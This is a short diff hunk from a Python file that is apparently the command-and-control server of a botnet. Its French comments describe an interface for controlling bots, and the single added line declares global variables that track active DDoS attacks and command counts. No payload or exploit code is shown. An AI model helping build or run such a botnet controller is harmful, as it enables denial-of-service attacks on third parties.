@@ -288,6 +288,7 @@ def print_banner():
 # Interface utilisateur du serveur C2
 def command_interface():
     """Interface utilisateur pour contrôler les bots"""
+    global active_ddos, total_commands
     print_banner()
     
     while True:
